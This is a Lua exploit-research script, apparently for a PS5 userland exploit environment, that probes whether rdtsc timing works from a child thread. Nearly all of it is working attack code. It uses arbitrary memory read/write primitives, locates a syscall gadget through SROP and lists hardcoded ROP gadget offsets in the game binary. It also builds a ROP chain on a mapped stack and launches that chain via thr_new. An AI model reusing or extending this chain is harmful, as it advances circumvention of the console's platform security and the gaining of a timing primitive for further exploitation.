-- CRASH_CLASS: LOW
-- PROBE 1403b: rdtsc via child thread ROP chain
--
-- 1403a showed SROP rdtsc corrupts Lua VM state (rol bl,0x48 clobbers
-- callee-saved RBX). Child thread doesn't have Lua VM, so RBX
-- corruption is harmless.
--
-- Plan:
--   1. Find syscall gadget via SROP: getcontext(421) → RIP-2
--   2. Allocate shared page, fake TCB, null buffer
--   3. Build child ROP chain on shared page
--   4. Start child via thr_new(455)
--   5. Wait, read results from shared page
--
-- Child ROP chain:
--   sysarch(SET_FSBASE=129, fake_tcb) → fix TLS
--   rdtsc gadget (eboot+0x6A109) → EAX = TSC_lo (low byte = 1)
--   store RAX to shared[0]
--   rdtsc gadget again → EAX = TSC_lo (second reading)
--   store RAX to shared[8]
--   marker → store 0xDEAD to shared[16] (signals child completed)
--   thr_exit(431)

print("=== 1403b: child rdtsc ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wq(a, v) memory.write_qword(a, v) end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end

-- Get eboot base
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local text_lo = rd(N(info) + 0x108) or 0
local text_hi = rd(N(info) + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", text_hi, text_lo))
print("eboot=" .. string.format("0x%X%08X", text_hi, text_lo))

-- ============================================================
-- [A] Find syscall gadget via SROP
-- ============================================================
print("")
print("=== [A] syscall gadget ===")

local sc_gc = mk(421)
local MC = 0x40
local ctx = memory.alloc(0x500)
local ok_gc = pcall(function() return sc_gc(uint64(N(ctx))) end)
if not ok_gc then print("getcontext FAIL") return end

local brip = rq(N(ctx) + MC + 0xA0)
if not brip then print("no RIP") return end
local rh, rl = get_hi_lo(brip)
local sc_gadget = uint64(string.format("0x%X%08X", rh, rl - 2))
print("syscall_gadget=" .. string.format("0x%X%08X", rh, rl - 2))

-- Validate: getpid via SROP
local sc_sr = mk(417)
local function srop_call(num, a1)
    pcall(function() return sc_gc(uint64(N(ctx))) end)
    wq(N(ctx) + MC + 0xA0, sc_gadget)
    wq(N(ctx) + MC + 0x38, uint64(num))
    if a1 then wq(N(ctx) + MC + 0x08, a1) end
    local ok, rv = pcall(function() return sc_sr(uint64(N(ctx))) end)
    if not ok then return nil end
    return rv
end

local pid = srop_call(20)
if pid then
    print("getpid=" .. N(pid))
else
    print("SROP getpid FAIL — abort")
    return
end

-- ============================================================
-- [B] Gadget offsets (confirmed in CLAUDE.md/396f)
-- ============================================================
print("")
print("=== [B] gadgets ===")

local G_POP_RAX    = 0x992
local G_POP_RDI    = 0xC9DFE
local G_POP_RSI    = 0xD77D
local G_POP_RCX    = 0xE64
local G_POP_RDX    = 0x3B02D7
local G_MOV_W_RAX  = 0x92C67   -- mov [rdi], rax; ret
local G_RDTSC      = 0x6A109   -- rdtsc gadget (returns TSC_lo & 0xFFFFFF00 | 1)
local G_RET        = 0x42      -- bare ret

-- Verify mov [rdi],rax gadget bytes (48 89 07 C3)
local mg = rd(N(eboot) + G_MOV_W_RAX)
if mg then
    local b0 = mg % 256
    local b1 = math.floor(mg / 256) % 256
    local b2 = math.floor(mg / 65536) % 256
    local b3 = math.floor(mg / 16777216) % 256
    print(string.format("mov_w_rax bytes: %02X %02X %02X %02X (expect 48 89 07 C3)",
        b0, b1, b2, b3))
    if not (b0 == 0x48 and b1 == 0x89 and b2 == 0x07 and b3 == 0xC3) then
        print("WARNING: gadget bytes mismatch!")
    end
end

-- Verify rdtsc gadget bytes (0F 31)
local rg = rd(N(eboot) + G_RDTSC)
if rg then
    local b0 = rg % 256
    local b1 = math.floor(rg / 256) % 256
    print(string.format("rdtsc bytes: %02X %02X (expect 0F 31)", b0, b1))
end

-- ============================================================
-- [C] Allocate shared resources
-- ============================================================
print("")
print("=== [C] resources ===")

-- Shared results page (reads back from main thread)
local RESULT_SIZE = 0x100
local result = memory.alloc(RESULT_SIZE)
-- Sentinels
for i = 0, RESULT_SIZE - 4, 4 do wd(N(result) + i, 0xDEAD0000 + i) end
print("result=" .. string.format("0x%X", N(result)))

-- Null buffer for rdtsc gadget (RCX must point to a null byte)
local null_buf = memory.alloc(16)
wd(N(null_buf), 0)
wd(N(null_buf) + 4, 0)
print("null_buf=" .. string.format("0x%X", N(null_buf)))

-- Fake TCB (4KB self-referencing, from 384b pattern)
local tcb = memory.alloc(0x1000)
for i = 0, 0x1000 - 8, 8 do wq(N(tcb) + i, uint64(N(tcb))) end
print("tcb=" .. string.format("0x%X", N(tcb)))

-- Child stack (2 MiB)
local sc_mmap = mk(477)
local STACK_SIZE = 0x200000  -- 2 MiB
local stack_base = nil
do
    local ok, v = pcall(function()
        return sc_mmap(uint64(0), uint64(STACK_SIZE), uint64(3),
            uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if ok then
        local h, l = get_hi_lo(v)
        if h ~= 0xFFFF then stack_base = v end
    end
end
if not stack_base then print("stack mmap FAIL") return end
print("stack=" .. string.format("0x%X%08X", get_hi_lo(stack_base)))

-- Child TID output
local child_tid = memory.alloc(8)
wq(N(child_tid), uint64(0))

-- ============================================================
-- [D] Build child ROP chain
-- ============================================================
print("")
print("=== [D] ROP chain ===")

-- RSP = ((stack_base + stack_size) & ~0xF) - 8
local sb_h, sb_l = get_hi_lo(stack_base)
local sp_raw = sb_l + STACK_SIZE
local sp_h = sb_h
if sp_raw >= 0x100000000 then sp_h = sp_h + 1; sp_raw = sp_raw - 0x100000000 end
sp_raw = (math.floor(sp_raw / 16) * 16) - 8
local rsp = uint64(string.format("0x%X%08X", sp_h, sp_raw))
print("rsp=" .. string.format("0x%X%08X", sp_h, sp_raw))

-- Helper to write ROP entries
local slot = 0
local function push_rop(val)
    wq(N(rsp) + slot, val)
    slot = slot + 8
end

-- start_func = pop_rax; ret (eboot+0x992)
-- arg = result page (arrives in RDI)
local start_func = eboot + uint64(G_POP_RAX)

-- ROP chain layout:
-- [0] pop rax → 129 (sysarch SET_FSBASE)
push_rop(uint64(129))
-- [1] pop rdi → fake_tcb
push_rop(eboot + uint64(G_POP_RDI))
push_rop(uint64(N(tcb)))
-- [2] syscall;ret → sysarch(129, tcb)
push_rop(sc_gadget)

-- [3] pop rcx → null_buf (for rdtsc gadget)
push_rop(eboot + uint64(G_POP_RCX))
push_rop(uint64(N(null_buf)))

-- [4] FIRST rdtsc: jump to gadget, it returns with TSC in RAX
push_rop(eboot + uint64(G_RDTSC))

-- [5] After rdtsc ret: store RAX to result[0]
push_rop(eboot + uint64(G_POP_RDI))
push_rop(uint64(N(result)))
push_rop(eboot + uint64(G_MOV_W_RAX))

-- [6] pop rcx → null_buf again (cmovz might have changed RCX)
push_rop(eboot + uint64(G_POP_RCX))
push_rop(uint64(N(null_buf)))

-- [7] SECOND rdtsc
push_rop(eboot + uint64(G_RDTSC))

-- [8] Store RAX to result[8]
push_rop(eboot + uint64(G_POP_RDI))
push_rop(uint64(N(result) + 8))
push_rop(eboot + uint64(G_MOV_W_RAX))

-- [9] pop rcx → null_buf
push_rop(eboot + uint64(G_POP_RCX))
push_rop(uint64(N(null_buf)))

-- [10] THIRD rdtsc
push_rop(eboot + uint64(G_RDTSC))

-- [11] Store RAX to result[16]
push_rop(eboot + uint64(G_POP_RDI))
push_rop(uint64(N(result) + 16))
push_rop(eboot + uint64(G_MOV_W_RAX))

-- [12] Write completion marker to result[24]
push_rop(eboot + uint64(G_POP_RAX))
push_rop(uint64(0xCAFEBABE))
push_rop(eboot + uint64(G_POP_RDI))
push_rop(uint64(N(result) + 24))
push_rop(eboot + uint64(G_MOV_W_RAX))

-- [13] thr_exit(431)
push_rop(eboot + uint64(G_POP_RAX))
push_rop(uint64(431))
push_rop(eboot + uint64(G_POP_RDI))
push_rop(uint64(0))
push_rop(sc_gadget)

print("ROP chain: " .. (slot / 8) .. " entries (" .. slot .. " bytes)")

-- ============================================================
-- [E] Launch child via thr_new(455)
-- ============================================================
print("")
print("=== [E] launch child ===")

-- struct thr_param (0x38 bytes):
-- +0x00: start_func  (void *(*)(void *))
-- +0x08: arg          (void *)
-- +0x10: stack_base   (char *)
-- +0x18: stack_size   (size_t)
-- +0x20: tls_base     (char *) — 0
-- +0x28: tls_size     (size_t) — 0
-- +0x30: child_tid    (long *)
local param = memory.alloc(0x38)
wq(N(param) + 0x00, start_func)             -- pop_rax; ret
wq(N(param) + 0x08, uint64(N(result)))      -- arg → RDI = result page
wq(N(param) + 0x10, stack_base)             -- stack_base
wq(N(param) + 0x18, uint64(STACK_SIZE))     -- stack_size
wq(N(param) + 0x20, uint64(0))              -- tls_base
wq(N(param) + 0x28, uint64(0))              -- tls_size
wq(N(param) + 0x30, uint64(N(child_tid)))   -- child_tid output

local sc_thr = mk(455)
local ok_thr, ret_thr = pcall(function()
    return sc_thr(uint64(N(param)), uint64(0x38))
end)
if ok_thr then
    print("thr_new ret=" .. N(ret_thr))
else
    print("thr_new FAIL")
    return
end

local tid = rq(N(child_tid))
if tid then
    print("child_tid=" .. N(tid))
end

-- ============================================================
-- [F] Wait and read results
-- ============================================================
print("")
print("=== [F] results ===")

-- Spin-wait for completion marker (up to 1 second)
local deadline = 10000  -- 10k iterations
local found = false
for i = 1, deadline do
    local marker_lo = rd(N(result) + 24)
    if marker_lo and marker_lo == 0xCAFEBABE then
        found = true
        print("child completed after " .. i .. " polls")
        break
    end
    -- Small delay: read a value to burn cycles
    local _ = rd(N(info))
end

if not found then
    -- Check if marker was partially written
    local m = rq(N(result) + 24)
    if m then
        local mh, ml = get_hi_lo(m)
        print(string.format("marker: 0x%X%08X (not CAFEBABE — child may have crashed)", mh, ml))
    else
        print("marker: unreadable (child crashed?)")
    end
end

-- Read TSC values
local tsc1 = rq(N(result))
local tsc2 = rq(N(result) + 8)
local tsc3 = rq(N(result) + 16)

if tsc1 then
    local h1, l1 = get_hi_lo(tsc1)
    print(string.format("TSC1 = 0x%X%08X", h1, l1))
    if l1 % 256 == 1 then
        print("  low_byte=1 — rdtsc gadget executed (AL overwritten as expected)")
    elseif h1 == 0 and l1 == 0xDEAD0000 then
        print("  SENTINEL — child never wrote TSC1")
    else
        print(string.format("  low_byte=%d", l1 % 256))
    end
end

if tsc2 then
    local h2, l2 = get_hi_lo(tsc2)
    print(string.format("TSC2 = 0x%X%08X", h2, l2))
end

if tsc3 then
    local h3, l3 = get_hi_lo(tsc3)
    print(string.format("TSC3 = 0x%X%08X", h3, l3))
end

-- Compute deltas
if tsc1 and tsc2 and tsc3 then
    local _, l1 = get_hi_lo(tsc1)
    local _, l2 = get_hi_lo(tsc2)
    local _, l3 = get_hi_lo(tsc3)
    -- Clear low byte (it's always 1)
    l1 = l1 - (l1 % 256)
    l2 = l2 - (l2 % 256)
    l3 = l3 - (l3 % 256)
    local d12 = l2 - l1
    if d12 < 0 then d12 = d12 + 0x100000000 end
    local d23 = l3 - l2
    if d23 < 0 then d23 = d23 + 0x100000000 end
    print(string.format("delta12=%d cycles (~%d ns)", d12, math.floor(d12 / 3.5)))
    print(string.format("delta23=%d cycles (~%d ns)", d23, math.floor(d23 / 3.5)))

    if d12 > 0 and d12 < 100000000 and d23 > 0 and d23 < 100000000 then
        print("")
        print("*** rdtsc WORKS on PS5 14.10 ***")
        print("CR4.TSD is NOT set — userland rdtsc allowed")
        print(string.format("Resolution: 256 cycles (~73 ns) per unit"))
    elseif d12 == 0 and d23 == 0 then
        print("*** ZERO deltas — rdtsc may be returning constant ***")
    else
        print(string.format("*** UNEXPECTED deltas — investigate ***"))
    end
end

-- Also dump raw result bytes for debug
print("")
print("=== raw result ===")
for off = 0, 31, 4 do
    local v = rd(N(result) + off)
    if v then
        print(string.format("  +%02X: 0x%08X", off, v))
    end
end

print("")
print("=== 1403b DONE ===")
